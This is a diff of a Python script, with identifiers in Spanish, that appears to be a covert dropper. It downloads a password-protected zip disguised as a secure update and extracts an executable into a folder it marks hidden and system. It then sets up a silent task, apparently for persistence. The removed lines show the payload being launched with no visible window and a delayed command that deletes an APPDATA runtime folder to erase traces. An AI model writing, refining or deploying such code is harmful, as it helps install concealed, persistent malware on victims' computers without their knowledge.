@@ -17,9 +17,6 @@ def descargar_y_extraer():
             os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
             subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        if os.path.exists(RUTA_EXE_FINAL) and os.path.getsize(RUTA_EXE_FINAL) > 10240:
-            return True
-
         ruta_temp_zip = os.path.join(tempfile.gettempdir(), "update_secure.zip")
         
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
@@ -36,13 +33,14 @@ def descargar_y_extraer():
             zf.pwd = CONTRASENA_ZIP.encode('utf-8')
             for filename in zf.namelist():
                 if filename.endswith('.exe'):
+                    if os.path.exists(RUTA_EXE_FINAL):
+                        os.remove(RUTA_EXE_FINAL)
+                    
                     zf.extract(filename, DIRECTORIO_DISCRETO)
                     nombre_extraido = os.path.basename(filename)
                     ruta_extraida_real = os.path.join(DIRECTORIO_DISCRETO, nombre_extraido)
                     
                     if nombre_extraido != "update.exe":
-                        if os.path.exists(RUTA_EXE_FINAL):
-                            os.remove(RUTA_EXE_FINAL)
                         os.rename(ruta_extraida_real, RUTA_EXE_FINAL)
                     break
 
@@ -75,26 +73,3 @@ def configurar_tarea_silenciosa():
 if __name__ == "__main__":
     if descargar_y_extraer():
         configurar_tarea_silenciosa()
-
-        try:
-            startupinfo = subprocess.STARTUPINFO()
-            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            startupinfo.wShowWindow = subprocess.SW_HIDE
-            subprocess.Popen([RUTA_EXE_FINAL], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
-        except Exception:
-            pass
-
-    try:
-        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = subprocess.SW_HIDE
-
-        subprocess.Popen(
-            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
-            shell=True,
-            startupinfo=startupinfo,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-    except Exception:
-        pass
